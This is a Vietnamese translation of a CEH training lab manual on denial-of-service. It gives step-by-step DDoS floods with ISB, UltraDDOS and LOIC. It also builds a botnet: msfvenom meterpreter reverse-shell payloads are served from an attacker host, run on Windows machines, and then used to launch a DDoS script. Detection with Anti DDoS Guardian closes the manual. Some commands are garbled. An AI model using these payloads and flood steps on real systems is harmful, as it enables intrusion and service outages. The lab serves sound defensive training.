Mô-đun 10: Từ chối dịch vụ

Kịch bản

Các cuộc tấn công từ chối dịch vụ (DoS) và từ chối dịch vụ phân tán (DDoS) đã trở thành mối đe dọa lớn đối với mạng máy tính. Những cuộc tấn công này cố gắng làm cho máy hoặc tài nguyên mạng không khả dụng đối với người dùng được ủy quyền. Thông thường, các cuộc tấn công DoS và DDoS khai thác các lỗ hổng trong quá trình triển khai giao thức mô hình TCP/IP hoặc các lỗi trong một hệ điều hành cụ thể.

Trong một cuộc tấn công DoS, những kẻ tấn công tràn ngập hệ thống của nạn nhân với các yêu cầu dịch vụ hoặc lưu lượng truy cập không hợp pháp để làm quá tải tài nguyên của nó, khiến hệ thống ngừng hoạt động và dẫn đến không thể truy cập trang web của nạn nhân - hoặc ít nhất là làm chậm đáng kể hiệu suất mạng hoặc hệ thống của nạn nhân. Mục tiêu của cuộc tấn công DoS không phải là giành quyền truy cập trái phép vào hệ thống hoặc làm hỏng dữ liệu mà là ngăn cản người dùng hợp pháp sử dụng hệ thống.

Thủ phạm của các cuộc tấn công DoS thường nhắm mục tiêu vào các trang web hoặc dịch vụ được lưu trữ trên các máy chủ web cao cấp như ngân hàng, cổng thanh toán thẻ tín dụng và thậm chí cả máy chủ tên gốc.

Nói chung, các cuộc tấn công DoS nhắm vào băng thông hoặc kết nối mạng. Các cuộc tấn công băng thông làm tràn mạng với lưu lượng truy cập lớn sử dụng tài nguyên mạng hiện có, do đó tước đi những tài nguyên này của người dùng hợp pháp. Các cuộc tấn công kết nối làm tràn máy tính với vô số yêu cầu kết nối, tiêu tốn tất cả tài nguyên hệ điều hành có sẵn, khiến máy tính không thể xử lý các yêu cầu hợp pháp của người dùng.

Là một hacker có đạo đức chuyên nghiệp hoặc người kiểm tra thâm nhập (sau đây gọi là chuyên gia kiểm thử xâm nhập (pentester)), bạn phải có kiến ​​thức vững chắc về các cuộc tấn công DoS và DDoS để phát hiện và vô hiệu hóa các trình xử lý tấn công cũng như giảm thiểu các cuộc tấn công đó.

Các bài lab trong mô-đun này cung cấp trải nghiệm thực tế trong việc kiểm tra mạng chống lại các cuộc tấn công DoS và DDoS.

Mục tiêu

Mục tiêu của lab là thực hiện tấn công DoS và các nhiệm vụ khác bao gồm nhưng không giới hạn ở:

-   Thực hiện tấn công DoS bằng cách liên tục gửi một số lượng lớn gói SYN

-   Thực hiện tấn công DoS (SYN Flooding, Ping of Death (PoD) và lũ lớp ứng dụng UDP) trên máy chủ mục tiêu

-   Thực hiện tấn công DDoS

-   Phát hiện và phân tích lưu lượng tấn công DoS

-   Phát hiện và bảo vệ khỏi cuộc tấn công DDoS

Tổng quan về Từ chối Dịch vụ

Tấn công DoS là một kiểu phá vỡ bảo mật thường không dẫn đến việc đánh cắp thông tin. Tuy nhiên, những cuộc tấn công này có thể gây tổn hại cho mục tiêu về thời gian và nguồn lực. Hơn nữa, việc không bảo vệ khỏi các cuộc tấn công như vậy có thể đồng nghĩa với việc mất một dịch vụ như email. Trong trường hợp xấu nhất, một cuộc tấn công DoS có thể đồng nghĩa với việc vô tình phá hủy các tập tin và chương trình của hàng triệu người đang lướt Web vào thời điểm xảy ra cuộc tấn công.

Một số ví dụ về các kiểu tấn công DoS:

-   Làm ngập hệ thống của nạn nhân với lưu lượng truy cập nhiều hơn mức nó có thể xử lý

-   Làm ngập một dịch vụ (chẳng hạn như trò chuyện chuyển tiếp internet (IRC)) với nhiều sự kiện hơn mức nó có thể xử lý

-   Làm hỏng ngăn xếp giao thức điều khiển truyền dẫn (TCP)/giao thức internet (IP) bằng cách gửi các gói bị hỏng

-   Làm hỏng một dịch vụ do tương tác với nó theo cách không mong đợi

-   Treo hệ thống bằng cách khiến nó rơi vào một vòng lặp vô hạn

Nhiệm vụ bài lab

Tin tặc có đạo đức hoặc chuyên gia kiểm thử xâm nhập (pentester) sử dụng nhiều công cụ và kỹ thuật để thực hiện các cuộc tấn công DoS và DDoS trên mạng mục tiêu. Các bài lab được đề xuất sẽ hỗ trợ bạn học các kỹ thuật tấn công DoS khác nhau bao gồm:

1.  Thực hiện các cuộc tấn công DoS và DDoS bằng nhiều Kỹ thuật khác nhau

    -   Thực hiện tấn công DDoS bằng ISB và UltraDDOS-v2

    -   Thực hiện tấn công DDoS bằng Botnet

2.  Phát hiện và bảo vệ khỏi các cuộc tấn công DoS, DDoS

    -   Phát hiện và bảo vệ chống lại các cuộc tấn công DDoS bằng Anti DDoS Guardian

Lab 1: Thực hiện các cuộc tấn công DoS và DDoS bằng nhiều kỹ thuật khác nhau

**Kịch bản bài lab**

Các cuộc tấn công DoS và DDoS đã trở nên phổ biến do khả năng tiếp cận dễ dàng các kế hoạch khai thác và khối lượng công việc trí óc cần thiết không đáng kể khi thực hiện chúng. Những cuộc tấn công này có thể rất nguy hiểm vì chúng có thể nhanh chóng tiêu thụ các máy chủ lớn nhất trên Internet, khiến chúng trở nên vô dụng. Tác động của các cuộc tấn công này bao gồm mất thiện chí, mạng lưới bị vô hiệu hóa, tổn thất tài chính và các tổ chức bị vô hiệu hóa.

Trong một cuộc tấn công DDoS, nhiều ứng dụng tấn công trình duyệt hoặc mạng mục tiêu bằng các yêu cầu bên ngoài giả mạo khiến hệ thống, mạng, trình duyệt hoặc trang web bị chậm, vô dụng và bị vô hiệu hóa hoặc không khả dụng.

Kẻ tấn công bắt đầu cuộc tấn công DDoS bằng cách gửi lệnh tới các tác nhân zombie. Các tác nhân zombie này gửi yêu cầu kết nối tới một số lượng lớn hệ thống phản xạ với địa chỉ IP giả mạo của nạn nhân. Hệ thống phản xạ coi những yêu cầu này đến từ máy của nạn nhân thay vì là tác nhân zombie do địa chỉ IP nguồn giả mạo. Do đó, chúng gửi thông tin được yêu cầu (phản hồi yêu cầu kết nối) cho nạn nhân. Máy của nạn nhân tràn ngập các phản hồi không được yêu cầu từ nhiều máy tính phản xạ cùng một lúc. Điều này có thể làm giảm hiệu suất hoặc thậm chí có thể khiến máy của nạn nhân tắt hoàn toàn.

Là một hacker có đạo đức chuyên nghiệp hoặc chuyên gia kiểm thử xâm nhập (pentester), bạn phải có kiến ​​thức cần thiết để thực hiện các cuộc tấn công DoS và DDoS để có thể kiểm tra các hệ thống trong mạng mục tiêu.

Trong bài lab này, bạn sẽ có được kinh nghiệm thực tế trong việc kiểm tra tài nguyên mạng chống lại các cuộc tấn công DoS và DDoS.

**Mục tiêu bài lab**

-   Thực hiện tấn công DDoS bằng ISB và UltraDDOS-v2

-   Thực hiện tấn công DDoS bằng Botnet

**Tổng quan về các cuộc tấn công DoS và DDoS**

Các cuộc tấn công DDoS chủ yếu nhắm vào băng thông mạng; chúng làm cạn kiệt tài nguyên mạng, ứng dụng hoặc dịch vụ và do đó hạn chế người dùng hợp pháp truy cập tài nguyên mạng hoặc hệ thống của họ.

Nói chung, sau đây là các loại vectơ tấn công DoS/DDoS:

-   **Tấn công số lượng lớn: Tiêu tốn băng thông của mạng hoặc dịch vụ mục tiêu**

> Kỹ thuật tấn công:

-   Tấn công lũ lụt UDP

-   Tấn công lũ lụt ICMP

-   Ping tử thần và cuộc tấn công của Smurf

-   Sóng xung và tấn công zero-day

```{=html}
<!-- -->
```
-   **Tấn công giao thức: Tiêu tốn các tài nguyên như bảng trạng thái kết nối có trong các thành phần cơ sở hạ tầng mạng như bộ cân bằng tải, tường lửa và máy chủ ứng dụng**

> Kỹ thuật tấn công:

-   Cuộc tấn công lũ lụt SYN

-   Tấn công phân mảnh

-   Tấn công lũ lụt phiên giả mạo

-   Cuộc tấn công lũ lụt ACK

```{=html}
<!-- -->
```
-   **Tấn công lớp ứng dụng: Tiêu tốn tài nguyên hoặc dịch vụ của ứng dụng, do đó khiến những người dùng hợp pháp khác không thể sử dụng chúng**

> Kỹ thuật tấn công:

-   Tấn công HTTP GET/POST

-   Cuộc tấn công của Slowloris

-   Tấn công lũ lụt lớp ứng dụng UDP

-   Tấn công tống tiền DDoS

Nhiệm vụ 1: Thực hiện tấn công DDoS bằng ISB và UltraDDOS-v2

ISB (I\'m So Bored) và UltraDDOS-v2 là các tiện ích được thiết kế riêng cho các mạng thử nghiệm căng thẳng trên Windows, tạo điều kiện thuận lợi cho việc thực hiện các cuộc tấn công DDoS chống lại các máy mục tiêu.

Ở đây, chúng tôi sẽ sử dụng ISB và UltraDDOS-v2 để thực hiện tấn công DDoS trên máy mục tiêu (ở đây là Windows Server 2019).

1.  Nhấp vào Windows 11 để chuyển sang máy Windows 11. Điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 10 Công cụ tấn công từ chối dịch vụ\\DoS và DDoS\\ISB và nhấp đúp vào ISB (Tôi thấy chán).exe.[Windows 11](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

> ![Screenshot](media/image2.jpeg){width="10.6625in" height="8.0in"}
>
> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có.

2.  Cửa sổ ISB xuất hiện, bằng cách sử dụng công cụ này, chúng tôi có thể thực hiện nhiều cuộc tấn công khác nhau như HTTP Flood, UDP Flood, TCP Flood, TCP Port Scan, ICMP Flood và Slowloris. Ngoài ra, chúng tôi có thể thu thập Thông tin mục tiêu bằng cách sử dụng các tùy chọn WHOIS, NS, TRACEROUTE, BROWSER, PING có trong công cụ.

3.  Tại đây, chúng tôi sẽ thực hiện cuộc tấn công TCP Flood trên máy Windows Server 2019 mục tiêu. Để làm như vậy, hãy nhập địa chỉ IP của Windows Server 2019 vào trường URL: (ở đây, 10.10.1.19), số cổng (ở đây, 80) trong trường Cổng: và nhấp vào Đặt mục tiêu.

4.  Địa chỉ IP của Windows Server 2019 cùng với số cổng xuất hiện trong trường Set: .

> ![isb1.jpg](media/image3.jpeg){width="10.6625in" height="8.0in"}

5.  Bây giờ, trong Tấn công điều hướng đến tab TCP Flood và nhập 10 vào trường Khoảng thời gian, 256 trong trường Bộ đệm và 1000 trong trường Chủ đề.

> ![isb2.jpg](media/image4.jpeg){width="10.6625in" height="8.0in"}

6.  Để cửa sổ ISB chạy và nhấp vào Windows Server 2022 để chuyển sang máy Windows Server 2022.[Windows Server 2022](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

7.  Trong máy Windows Server 2022, hãy điều hướng đến Z:\\CEHv13 Mô-đun 10 Từ chối dịch vụ\\DoS và Công cụ tấn công DDoS\\UltraDDoS và nhấp đúp vào tệp ultraddos.exe.

> Nếu Xuất hiện tệp đang mở - Cảnh báo bảo mật, hãy nhấp vào Chạy.
>
> ![Screenshot](media/image5.jpeg){width="10.6625in" height="8.0in"}

8.  Cửa sổ Dấu nhắc lệnh xuất hiện, trong cửa sổ Ultra DDOS v2, hãy nhấp vào OK.

9.  Trong cửa sổ Ultra DDOS v2 , hãy nhấp vào nút Tấn công DDOS.

> ![Screenshot](media/image6.jpeg){width="10.6625in" height="8.0in"}

10. Trong phần Vui lòng nhập mục tiêu của bạn. Đây là trang web hoặc địa chỉ IP mà bạn muốn tấn công. trường, hãy nhập 10.10.1.19 (địa chỉ IP của máy Windows Server 2019) và nhấp vào OK.

> ![Screenshot](media/image7.jpeg){width="10.6625in" height="8.0in"}

11. Trong phần Vui lòng nhập một cổng. 80 được sử dụng phổ biến nhất nhưng bạn có thể sử dụng bất kỳ cổng hợp lệ nào khác. trường, nhập 80 và nhấp vào OK.

> ![Screenshot](media/image8.jpeg){width="10.6625in" height="8.0in"}

12. Trong phần Vui lòng nhập số lượng gói bạn muốn gửi. Càng nhiều càng tốt, nhưng quá nhiều sẽ làm hỏng máy tính của bạn. trường, nhập 1000000 và nhấp vào OK.

13. Trong phần Vui lòng nhập số chủ đề bạn muốn gửi. Đây có thể là số tương tự như các gói. trường, nhập 1000000 và nhấp vào OK.

> ![Screenshot](media/image9.jpeg){width="10.6625in" height="8.0in"}

14. Trong phần Cuộc tấn công sẽ bắt đầu khi bạn nhấn OK. Nó sẽ tiếp tục cho đến khi tất cả các gói yêu cầu được gửi đi. cửa sổ bật lên, hãy nhấp vào OK.

> ![Screenshot](media/image10.jpeg){width="10.6625in" height="8.0in"}

15. Ngay khi bạn nhấp vào OK công cụ sẽ bắt đầu cuộc tấn công DoS trên máy Windows Server 2019.

> ![Screenshot](media/image11.jpeg){width="10.6625in" height="8.0in"}

16. Nhấp vào Windows 11 để chuyển sang máy Windows 11 và trong cửa sổ ISB, hãy nhấp vào nút Bắt đầu tấn công.[Windows 11](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

> ![Screenshot](media/image12.jpeg){width="10.6625in" height="8.0in"}

17. Nhấp vào Windows Server 2019 để chuyển sang máy Windows Server 2019.[Windows Server 2019](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

18. Bây giờ, hãy nhấp vào trường Nhập vào đây để tìm kiếm trên Máy tính để bàn, tìm kiếm resmon trong thanh tìm kiếm và chọn resmon từ kết quả.

19. Cửa sổ Resource Monitor xuất hiện, bạn có thể thấy mức sử dụng CPU trong phần CPU là hơn 80%, do đó làm giảm hiệu suất hệ thống.

> Khi bạn thực hiện bài thí nghiệm này, việc sử dụng CPU có thể khác nhau.
>
> Trong thời gian thực, cuộc tấn công DDoS được thực hiện từ nhiều máy có thể làm hỏng hệ thống.
>
> ![Screenshot](media/image13.jpeg){width="10.6625in" height="8.0in"}

20. Phần này kết thúc phần minh họa cách thực hiện tấn công DDoS bằng cách sử dụng các công cụ ISB (I\'m So Bored) và UltraDDOS-v2.

21. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 10.1.1.1**

Trên máy Windows 11 sử dụng ISB (nằm tại E:\\CEH-Tools\\CEHv13 Module 10 Denial-of-Service\\DoS and DDoS Attack Tools\\ISB) và Trên máy Windows Server 2022 sử dụng UltraDDoS (nằm tại Z:\\CEHv13 Module 10 Denial-of-Service\\DoS and DDoS Attack Tools\\UltraDDoS) để khởi động cuộc tấn công DoS trên Windows Server 2019 máy (10.10.1.19). Xác định số cổng mà cuộc tấn công DoS nhắm tới.

![](media/image14.wmf)

Nhiệm vụ 2: Thực hiện tấn công DDoS bằng Botnet

Botnet tổ chức một cuộc tấn công từ chối dịch vụ (DDoS) phân tán bằng cách khai thác mạng lưới các máy tính bị xâm nhập (bot). Kẻ tấn công lây nhiễm phần mềm độc hại vào các hệ thống này, cho phép điều khiển từ xa. Thông qua một máy chủ chỉ huy và kiểm soát, kẻ tấn công chỉ đạo botnet tràn ngập mục tiêu với lưu lượng truy cập quá mức, áp đảo tài nguyên của nó. Sự tấn công dữ dội này làm gián đoạn các dịch vụ, gây ra thời gian ngừng hoạt động và tổn thất tài chính. Những kẻ tấn công có thể khuếch đại cuộc tấn công bằng các kỹ thuật như phản xạ hoặc khuếch đại. Giảm thiểu liên quan đến việc lọc và chặn lưu lượng truy cập độc hại. Tuy nhiên, việc sử dụng botnet để tấn công DDoS là bất hợp pháp và phi đạo đức, gây ra hậu quả pháp lý nghiêm trọng và thiệt hại tiềm tàng cho các tổ chức mục tiêu.

Ở đây, chúng tôi sẽ xâm phạm các máy Windows 11 và Windows Server 2019 để tạo mạng botnet và máy nhắm mục tiêu Ubuntu.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt. Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).[Parrot Security](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

2.  Chạy lệnh msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe \> khai thác1.exe để tạo tải trọng khai thác1.exe.

> ![Screenshot](media/image15.jpeg){width="10.6625in" height="8.0in"}

3.  Tương tự, hãy chạy lệnh trên với số cổng và tên khai thác khác.

    -   Đối với Windows 11 -\> cổng 6969, mining1.exe

    -   Đối với Windows Server 2019 -\> cổng 9999, mining2.exe

    -   Đối với Windows Server 2022 -\> cổng 5555, mining3.exe

> ![Screenshot](media/image16.jpeg){width="10.6625in" height="8.0in"}

4.  Tạo một thư mục mới để chia sẻ tệp khai thác với máy mục tiêu và cung cấp quyền bằng các lệnh bên dưới:

    -   Chạy lệnh mkdir /var/www/html/share để tạo thư mục dùng chung

    -   Chạy chmod -R 755 /var/www/html/share/ lệnh

    -   Chạy chown -R www-data:www-data /var/www/html/share/ command

> ![Screenshot](media/image17.jpeg){width="10.6625in" height="8.0in"}

5.  Sao chép tải trọng vào thư mục dùng chung bằng cách thực thi lệnh cpexplorer1.exeexplorer2.exeexplorer3.exe /var/www/html/share/.

6.  Khởi động máy chủ Apache bằng cách chạy lệnh khởi động dịch vụ apache2.

> ![Screenshot](media/image18.jpeg){width="10.6625in" height="8.0in"}

7.  Khởi chạy ba terminal / dòng lệnh mới và chạy lệnh sudo su với mật khẩu trên tất cả.

8.  Chạy lệnh msfconsole -x \"use detect/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run\" để khởi chạy Metasploit Framework trên terminal 1.

> ![Screenshot](media/image19.jpeg){width="10.6625in" height="8.0in"}

9.  Tương tự, hãy chạy lệnh trên trên terminal / dòng lệnh 2 và 3 bằng cách thay đổi lport thành 9999 và 5555 đồng thời.

10. Nhấp vào Windows 11 để chuyển sang máy Windows 11.[Windows 11](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

11. Mở bất kỳ trình duyệt web nào (ở đây, Mozilla Firefox), truy cập http://10.10.1.13/share. Ngay khi bạn nhấn enter, nó sẽ hiển thị nội dung thư mục dùng chung.

12. Nhấp vào exploit1.exe để tải tệp xuống.

> Nếu nó đưa ra cảnh báo bảo mật, hãy bỏ qua và tải xuống bằng cách nhấp vào nút Giữ .
>
> ![98765432.jpg](media/image20.jpeg){width="10.6625in" height="8.0in"}

13. Điều hướng đến Tải xuống và nhấp đúp vào tệp exploit1.exe để chạy tệp đó.

14. Tương tự, hãy tải xuống exploit2.exe trên Windows Server 2019 và exploit3.exe trên Windows Server 2022 và chạy nó.

15. Sau khi thực hiện tất cả các hoạt động khai thác trên máy, hãy nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

16. Phiên đo đã được mở thành công, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image21.jpeg){width="10.6625in" height="8.0in"} ![Screenshot](media/image22.jpeg){width="10.6625in" height="8.0in"} ![Screenshot](media/image23.jpeg){width="10.6625in" height="8.0in"}

17. Bây giờ, chúng ta sẽ tải tập lệnh DDoS lên mạng botnet của mình, trong terminal / dòng lệnh shell của Windows, thực thi lệnh tải lên /home/Attacker/Downloads/eagle-dos.py và chạy lệnh shell.

> Tải tập lệnh DDoS lên tất cả các terminal / dòng lệnh shell
>
> ![Screenshot](media/image24.jpeg){width="10.6625in" height="8.0in"}

18. Chạy tệp DDoS bằng lệnh python Eagle-dos.py trên terminal / dòng lệnh Windows shell. Nó sẽ yêu cầu IP của Target, nhập 10.10.1.9 và nhấn enter.

> Đảm bảo bạn chạy tập lệnh trên cả 3 terminal / dòng lệnh shell.
>
> ![Screenshot](media/image25.jpeg){width="10.6625in" height="8.0in"}
>
> ![Screenshot](media/image26.jpeg){width="10.6625in" height="8.0in"}

19. Nhấp vào Ubuntu để chuyển sang máy Ubuntu. Bây giờ, hãy cùng chúng tôi xác minh xem DDOS có sử dụng Wireshark hay không, nơi chúng tôi có thể xem các gói từ 10.10.1.11, 10.10.1.19 và 10.10.1.22 là các botnet của chúng tôi. Mở terminal / dòng lệnh và chạy lệnh sudo Wireshark, nhập toor làm mật khẩu và nhấp đúp vào eth0 để bắt đầu chụp.

> ![Screenshot](media/image27.jpeg){width="10.6625in" height="8.0in"} ![Screenshot](media/image28.jpeg){width="10.6625in" height="8.0in"}

20. Đợi 5-6 phút, sau đó nhấp vào Hiển thị ứng dụng rồi tìm kiếm và khởi chạy Giám sát hệ thống. Trong cửa sổ Giám sát hệ thống, hãy quan sát mức sử dụng bộ nhớ. Trong trường hợp này, tỷ lệ này là 98,7%, làm chậm máy Ubuntu và cũng khiến máy không phản hồi.

> ![Screenshot](media/image29.jpeg){width="10.6625in" height="8.0in"}
>
> ![Screenshot](media/image30.jpeg){width="10.6625in" height="8.0in"}

21. Khởi động lại máy Ubuntu và ngăn chặn cuộc tấn công DDoS trên máy Parrot Security.

**Câu 10.1.2.1**

Sử dụng máy Parrot Security để xâm phạm các máy Windows 11, Windows Server 2022 và Windows Server 2019 bằng Metasploit và chạy tập lệnh Eagle-dos.py từ các hệ thống bị xâm nhập để khởi động cuộc tấn công DoS trên máy Ubuntu (10.10.1.9) và phát hiện lưu lượng DoS bằng Wireshark trên máy nạn nhân. Xác định Giao diện được chọn trên máy Ubuntu để nắm bắt lưu lượng mạng.

Lab 2: Phát hiện và bảo vệ chống lại các cuộc tấn công DoS và DDoS

**Kịch bản bài lab**

Các cuộc tấn công DoS/DDoS là một trong những mối đe dọa bảo mật hàng đầu trên Internet; do đó, cần có nhiều giải pháp để giảm thiểu các cuộc tấn công này. Kỹ thuật phát hiện sớm giúp ngăn chặn các cuộc tấn công DoS và DDoS. Phát hiện các cuộc tấn công như vậy là một công việc khó khăn. Trình phát hiện lưu lượng truy cập tấn công DoS và DDoS cần phân biệt giữa các gói dữ liệu thật và không có thật, điều này không phải lúc nào cũng thực hiện được; các kỹ thuật được sử dụng cho mục đích này là không hoàn hảo. Luôn có khả năng nhầm lẫn giữa lưu lượng truy cập được tạo bởi người dùng mạng hợp pháp và lưu lượng truy cập do cuộc tấn công DoS hoặc DDoS tạo ra. Một vấn đề trong việc lọc lưu lượng truy cập không có thật khỏi lưu lượng truy cập hợp pháp là lưu lượng truy cập. Không thể quét từng gói dữ liệu để đảm bảo an ninh trước cuộc tấn công DoS hoặc DDoS. Tất cả các kỹ thuật phát hiện được sử dụng ngày nay đều xác định một cuộc tấn công là một sai lệch bất thường và đáng chú ý trong các đặc điểm và thống kê lưu lượng truy cập mạng. Những kỹ thuật này liên quan đến việc phân tích thống kê các sai lệch để phân loại lưu lượng truy cập độc hại và lưu lượng truy cập thực sự.

Là một hacker có đạo đức chuyên nghiệp hoặc chuyên gia kiểm thử xâm nhập (pentester), bạn phải sử dụng nhiều kỹ thuật phát hiện cuộc tấn công DoS và DDoS khác nhau để ngăn chặn các hệ thống trong mạng bị hư hỏng.

bài lab này cung cấp trải nghiệm thực tế trong việc phát hiện các cuộc tấn công DoS và DDoS bằng các kỹ thuật phát hiện khác nhau.

**Mục tiêu bài lab**

-   Phát hiện và bảo vệ chống lại các cuộc tấn công DDoS bằng Anti DDoS Guardian

**Tổng quan về phát hiện tấn công DoS và DDoS**

Các kỹ thuật phát hiện dựa trên việc xác định và phân biệt sự gia tăng lưu lượng truy cập bất hợp pháp và các sự kiện flash với lưu lượng gói hợp pháp.

Sau đây là ba loại kỹ thuật phát hiện:

-   **Hồ sơ hoạt động: Hồ sơ dựa trên tốc độ gói trung bình cho luồng mạng, bao gồm các gói liên tiếp có thông tin tiêu đề gói tương tự**

-   **Phát hiện điểm thay đổi tuần tự: Lọc lưu lượng mạng theo địa chỉ IP, số cổng được nhắm mục tiêu và giao thức liên lạc được sử dụng, đồng thời lưu trữ dữ liệu luồng lưu lượng trong biểu đồ hiển thị tốc độ luồng lưu lượng theo thời gian**

-   **Phân tích tín hiệu dựa trên Wavelet: Phân tích lưu lượng mạng theo các thành phần quang phổ**

Nhiệm vụ 1: Phát hiện và bảo vệ chống lại các cuộc tấn công DDoS bằng Anti DDoS Guardian

Anti DDoS Guardian là một công cụ bảo vệ tấn công DDoS. Nó bảo vệ máy chủ IIS, máy chủ Apache, máy chủ trò chơi, máy chủ Camfrog, máy chủ thư, máy chủ FTP, tổng đài VOIP, máy chủ SIP và các hệ thống khác. Anti DDoS Guardian giám sát từng gói tin đến và đi trong Thời gian thực. Nó hiển thị địa chỉ cục bộ, địa chỉ từ xa và thông tin khác của từng luồng mạng. Anti DDoS Guardian giới hạn số lượng luồng mạng, băng thông máy khách, số kết nối TCP đồng thời của máy khách và tốc độ kết nối TCP. Nó cũng giới hạn băng thông UDP, tốc độ kết nối UDP và tốc độ gói UDP.

Tại đây, chúng tôi sẽ phát hiện và bảo vệ khỏi cuộc tấn công DDoS bằng cách sử dụng Anti DDoS Guardian.

Trong nhiệm vụ này, chúng tôi sẽ sử dụng máy Windows Server 2019 và Windows Server 2022 để thực hiện cuộc tấn công DDoS vào hệ thống mục tiêu, Windows 11.

1.  Trên máy Windows 11, hãy điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 10 Từ chối dịch vụ\\DoS và Công cụ bảo vệ DDoS\\Anti DDoS Guardian và nhấp đúp vào Anti_DDoS_Guardian_setup.exe.

> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có.
>
> Nếu cửa sổ bật lên Mở tệp - Cảnh báo bảo mật xuất hiện, hãy nhấp vào Chạy.

2.  Cửa sổ Thiết lập - Chống DDoS Guardian xuất hiện; nhấp vào Tiếp theo. Làm theo các bước cài đặt theo hướng dẫn của trình hướng dẫn để cài đặt ứng dụng.

3.  Trong trình hướng dẫn Dừng Windows Remote Desktop Brute Force , hãy bỏ chọn tùy chọn cài đặt Dừng RDP Brute Force rồi nhấp vào Tiếp theo.

> ![2.1.3.jpg](media/image31.jpeg){width="10.6625in" height="8.0in"}

4.  Thuật sĩ Chọn nhiệm vụ bổ sung xuất hiện; chọn tùy chọn Tạo lối tắt trên màn hình và nhấp vào Tiếp theo.

5.  Trình hướng dẫn Sẵn sàng cài đặt xuất hiện; nhấp vào Cài đặt.

6.  Cửa sổ Hoàn tất Trình hướng dẫn thiết lập người giám hộ chống DDoS sẽ xuất hiện; đảm bảo rằng tùy chọn Khởi chạy Chống DDoS Guardian được chọn và nhấp vào Hoàn tất.

> ![Screenshot](media/image32.jpeg){width="10.6625in" height="8.0in"}

7.  Cửa sổ Trình hướng dẫn chống DDoS xuất hiện; nhấp vào Tiếp tục trong tất cả các bước của trình hướng dẫn, để lại tất cả cài đặt mặc định. Trong cửa sổ cuối cùng, hãy nhấp vào Hoàn tất.

8.  Cửa sổ Chống DDoS Guardian xuất hiện, hiển thị thông tin về lưu lượng truy cập đến và đi, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image33.jpeg){width="10.6625in" height="8.0in"}

9.  Bây giờ, hãy nhấp vào Windows Server 2019 để chuyển sang Windows Server 2019. Đăng nhập bằng Quản trị viên/P@ssw0rd.[Windows Server 2019](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

10. Điều hướng đến Z:\\CEHv13 Mô-đun 10 Từ chối dịch vụ\\Công cụ tấn công DoS và DDoS\\Low Orbit Ion Cannon (LOIC) và nhấp đúp vào LOIC.exe.

> Nếu cửa sổ bật lên Mở tệp - Cảnh báo bảo mật xuất hiện, hãy nhấp vào Chạy.

11. Cửa sổ chính Pháo ion quỹ đạo thấp xuất hiện.

12. Thực hiện các cài đặt sau:

    -   Trong phần Chọn mục tiêu của bạn, hãy nhập địa chỉ IP mục tiêu vào trường IP (tại đây, 10.10.1.11), sau đó nhấp vào nút Khóa để thêm thiết bị mục tiêu.

    -   Trong phần Tùy chọn tấn công, hãy chọn UDP từ danh sách thả xuống trong Phương thức. Đặt giá trị của chuỗi thành 5 trong trường Chủ đề. Trượt thanh nguồn vào giữa.

> ![2.1.12qq.jpg](media/image34.jpeg){width="10.6625in" height="8.0in"}

13. Bây giờ, hãy chuyển sang máy Windows Server 2022 và làm theo Các bước#10-12 để khởi chạy LOIC và định cấu hình nó.

> Để chuyển sang Windows Server 2022, hãy nhấp vào Windows Server 2022.[Windows Server 2022](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

14. Sau khi LOIC được định cấu hình trên tất cả các máy, hãy chuyển sang từng máy (Windows Server 2019 và Windows Server 2022) rồi nhấp vào nút IMMA CHARGIN MAH LAZER trong phần Sẵn sàng? để bắt đầu cuộc tấn công DDoS trên máy Windows 11 mục tiêu.

> ![Screenshot](media/image35.jpeg){width="10.6625in" height="8.0in"}

15. Nhấp vào Windows 11 để chuyển về máy Windows 11 và quan sát các gói được ghi lại bởi Chống DDoS Guardian.[Windows 11](https://labclient.labondemand.com/Instructions/5e62cbc3-7e1c-4abe-9fde-c1935a4891a1?showWhenStarting=1)

16. Quan sát số lượng lớn gói đến từ máy chủ (10.10.1.19 \[Windows Server 2019\] và 10.10.1.22 \[Windows Server 2022\]).

> ![Screenshot](media/image36.jpeg){width="10.6625in" height="8.0in"} ![Screenshot](media/image37.jpeg){width="10.6625in" height="8.0in"}

17. Nhấp đúp vào bất kỳ phiên nào trong số các phiên 10.10.1.19 hoặc 10.10.1.22.

> Ở đây, chúng tôi đã chọn 10.10.1.22. Bạn có thể chọn một trong số họ.

18. Cửa sổ Trình xem chi tiết lưu lượng truy cập của người giám hộ chống DDoS xuất hiện, hiển thị nội dung của phiên đã chọn ở dạng dữ liệu thô. Bạn có thể quan sát số lượng lớn byte đến từ địa chỉ IP từ xa 10.10.1.22.

